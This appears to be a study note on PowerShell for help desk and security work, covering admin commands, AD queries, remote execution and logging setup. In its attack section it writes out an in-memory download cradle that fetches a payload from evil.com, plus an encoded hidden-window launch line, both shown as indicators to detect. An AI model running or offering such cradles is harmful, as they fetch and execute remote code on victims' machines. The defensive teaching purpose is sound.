# PowerShell for IT & Security
> The Swiss army knife every help desk tech needs to master — and every attacker already has.

PowerShell isn't just a better command prompt. It's a full scripting language, remote execution framework, and administrative API all in one. Every Windows admin task you do manually through a GUI can be automated, audited, and scaled through PowerShell. More importantly: it's the #1 tool attackers use for post-exploitation — understanding it defensively is non-negotiable.

---

## Why PowerShell Matters

- **Everything Windows exposes through WMI, .NET, and COM is reachable from PowerShell.** No GUI needed.
- **It remotes natively.** `Invoke-Command` lets you run code on 200 machines simultaneously.
- **Logs exist.** When [[Windows Event Logs]] capture PowerShell activity (Event ID 4104, 4103), every command run by every user is auditable.
- **Attackers live here.** [[Mimikatz]], [[Empire]], [[Cobalt Strike]] — all use PowerShell for delivery, persistence, and lateral movement. Knowing what malicious PS looks like is the difference between detecting a breach and missing it.

---

## Essential Commands

### `Get-Process`
List running processes. The CLI equivalent of Task Manager.

```powershell
# All processes
Get-Process

# Find a specific process
Get-Process -Name "chrome"

# Sort by CPU consumption
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10

# Find processes by PID
Get-Process -Id 1234
```

**Help desk use:** User says "my PC is slow." Pull top CPU consumers without touching the mouse. Compare against known baseline.

**Security angle:** Attackers often disguise processes with names similar to legit ones (`svchost.exe` vs `svch0st.exe`). `Get-Process | Where-Object { $_.Path -like "*Temp*" }` finds processes running from temp dirs — a red flag.

---

### `Get-Service`
List, start, stop, and query Windows services.

```powershell
# All services
Get-Service

# Find a specific service
Get-Service -Name "wuauserv"   # Windows Update

# Services that are stopped but set to auto-start
Get-Service | Where-Object { $_.Status -eq "Stopped" -and $_.StartType -eq "Automatic" }

# Start/stop a service
Start-Service -Name "Spooler"
Stop-Service  -Name "Spooler"

# Restart a remote service
Invoke-Command -ComputerName WORKSTATION01 -ScriptBlock { Restart-Service "Spooler" }
```

**Help desk use:** Printer broken? `Restart-Service Spooler` remotely without a truck roll.

**Security angle:** Attackers install persistence as services. `Get-Service | Where-Object { $_.DisplayName -notmatch "Microsoft|Windows" }` surfaces non-Microsoft services for review.

---

### `Get-EventLog` / `Get-WinEvent`
Read Windows Event Log entries. `Get-WinEvent` is newer and handles all log types; prefer it.

```powershell
# Last 50 System log errors
Get-EventLog -LogName System -EntryType Error -Newest 50

# More powerful: WinEvent with filter
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4625          # Failed logon
    StartTime = (Get-Date).AddHours(-24)
}

# Count failed logons per username last 24h
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24) } |
    ForEach-Object { $_.Properties[5].Value } |
    Group-Object | Sort-Object Count -Descending
```

**Help desk use:** "Someone says they were locked out." Pull all 4625 events for that username in the last hour without opening Event Viewer.

**Security angle:** 4624 (successful logon), 4625 (failed logon), 4634 (logoff), 4648 (explicit credential use), 4768/4769 (Kerberos). These are your SOC baseline. See [[Windows Event Logs]].

---

### `Get-ADUser` / `Get-ADComputer`
Query [[Active Directory]] user and computer objects. Requires the `ActiveDirectory` module (included on DCs; install RSAT on workstations).

```powershell
# Find a user
Get-ADUser -Identity "jsmith" -Properties *

# Find locked accounts
Get-ADUser -Filter { LockedOut -eq $true } -Properties LockedOut, LastLogonDate

# Accounts inactive 90+ days
$cutoff = (Get-Date).AddDays(-90)
Get-ADUser -Filter { LastLogonDate -lt $cutoff -and Enabled -eq $true } -Properties LastLogonDate |
    Select-Object Name, SamAccountName, LastLogonDate

# All computers in an OU
Get-ADComputer -SearchBase "OU=Workstations,DC=corp,DC=local" -Filter * | Select-Object Name, IPv4Address
```

**Help desk use:** Account locked? Expired? Wrong OU? Answer in seconds. No ADUC needed.

---

### `Set-ADUser`
Modify AD user properties.

```powershell
# Unlock account
Unlock-ADAccount -Identity "jsmith"

# Reset password (force change on next logon)
Set-ADAccountPassword -Identity "jsmith" -Reset -NewPassword (ConvertTo-SecureString "TempP@ss123!" -AsPlainText -Force)
Set-ADUser -Identity "jsmith" -ChangePasswordAtLogon $true

# Disable account
Disable-ADAccount -Identity "jsmith"

# Update display name and department
Set-ADUser -Identity "jsmith" -DisplayName "John Smith" -Department "Finance"
```

**Help desk use:** Onboarding/offboarding without opening 5 different MMC consoles.

---

### `Get-NetAdapter` / `Test-NetConnection`
Network diagnostics without ipconfig/ping.

```powershell
# All network adapters with status
Get-NetAdapter | Select-Object Name, Status, LinkSpeed, MacAddress

# Richer connectivity test (replaces ping + tracert)
Test-NetConnection -ComputerName "8.8.8.8" -Port 443

# Is port 3389 (RDP) open on a remote host?
Test-NetConnection -ComputerName "192.168.1.50" -Port 3389 -InformationLevel Quiet
```

**Help desk use:** Remote user can't reach the VPN? `Test-NetConnection corp-vpn.example.com -Port 443` tells you immediately whether it's a network or application problem.

---

### `Invoke-Command`
Run code on remote machines. **This is the most powerful command in the list.**

```powershell
# Run a command on one remote machine
Invoke-Command -ComputerName WORKSTATION01 -ScriptBlock { Get-Process | Sort-Object CPU -Desc | Select -First 5 }

# Run against multiple machines
$targets = "WS01","WS02","WS03"
Invoke-Command -ComputerName $targets -ScriptBlock { hostname; Get-Service "wuauserv" | Select Status }

# Run a local script remotely
Invoke-Command -ComputerName FILESERVER01 -FilePath C:\scripts\check-disk.ps1
```

**Help desk use:** Deploy a setting, collect a report, or restart a service across 50 machines at once. WinRM must be enabled on targets (it is by default on DCs; push via GPO for workstations).

**Security angle:** `Invoke-Command` is also how attackers execute [[lateral movement]]. Event ID 4688 + PowerShell ScriptBlock logs show remote execution attempts.

---

## Security Angle: PowerShell as an Attack Tool

### Why Attackers Love It
- Built into every Windows install — no download needed
- Can download and execute code in memory: `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')` — nothing written to disk
- Can encode commands in Base64 to bypass simple string matching: `powershell -enc <base64>`
- Directly accesses .NET, WMI, COM — can do almost anything a C program can

### What Malicious PowerShell Looks Like
```powershell
# Typical attack one-liner (obfuscated download-cradle)
powershell -NoP -NonI -W Hidden -Enc JABjAGw...

# Clear indicators:
# -Enc or -EncodedCommand  → encoded payload
# -NoP (NoProfile)         → skip loading user profile
# -W Hidden                → hidden window
# IEX / Invoke-Expression  → execute downloaded code
# DownloadString / DownloadFile → pulling from internet
# [Convert]::FromBase64String → decoding content at runtime
```

---

## PowerShell Logging — Enable This on Every Machine

Three independent logging mechanisms. Enable all three via GPO or local policy:

### 1. Script Block Logging (Event ID 4104)
Logs the **content of every PowerShell script block** executed — including decoded/deobfuscated code. The gold standard for detecting malicious PS.

```
GPO path: Computer Configuration → Administrative Templates →
  Windows Components → Windows PowerShell →
  Turn on PowerShell Script Block Logging → Enabled
```

### 2. Module Logging (Event ID 4103)
Logs **pipeline execution details** — every command, every parameter.

```
GPO path: Same location → Turn on Module Logging → Enabled
  Module names: * (log all modules)
```

### 3. Transcription Logging
Writes a full **human-readable transcript** of every PS session to a file on disk. Easy to read, easy to archive.

```powershell
# Enable via GPO or directly in PowerShell profile:
Start-Transcript -Path "C:\PSLogs\$env:USERNAME-$(Get-Date -Format yyyyMMdd-HHmmss).txt"
```

```
GPO path: Same location → Turn on PowerShell Transcription → Enabled
  Output Directory: \\FILESERVER\PSLogs\  (or local path)
```

**Read logs:** `Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational"` — look for Event ID 4104 with `WARNING` level (script block logging flags suspicious patterns automatically).

---

## Practical One-Liners

```powershell
# Find all locked AD accounts
Get-ADUser -Filter { LockedOut -eq $true } -Properties LockedOut |
    Select-Object Name, SamAccountName

# List users currently logged on to a remote machine
(Get-WmiObject -Class Win32_ComputerSystem -ComputerName WORKSTATION01).UserName

# Check disk space fleet-wide
$servers = "SRV01","SRV02","SRV03"
Invoke-Command -ComputerName $servers -ScriptBlock {
    Get-PSDrive -PSProvider FileSystem | Select-Object Name,
        @{n="UsedGB";e={[math]::Round($_.Used/1GB,1)}},
        @{n="FreeGB";e={[math]::Round($_.Free/1GB,1)}}
}

# Restart a failed service remotely
Invoke-Command -ComputerName PRINTSERVER01 -ScriptBlock { Restart-Service "Spooler" -Force }

# Find accounts with passwords set to never expire
Get-ADUser -Filter { PasswordNeverExpires -eq $true -and Enabled -eq $true } |
    Select-Object Name, SamAccountName

# Failed logon count per user last 1 hour
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625;StartTime=(Get-Date).AddHours(-1)} |
    ForEach-Object { $_.Properties[5].Value } |
    Group-Object | Sort-Object Count -Descending | Select-Object -First 10

# List all services running as a specific account
Get-WmiObject Win32_Service | Where-Object { $_.StartName -like "*svcaccount*" }
```

---

## Tags
`[[PowerShell]]` `[[Active Directory]]` `[[Windows Event Logs]]` `[[CySA+]]` `[[Security+]]` `[[Windows]]` `[[Help Desk]]` `[[Lateral Movement]]`
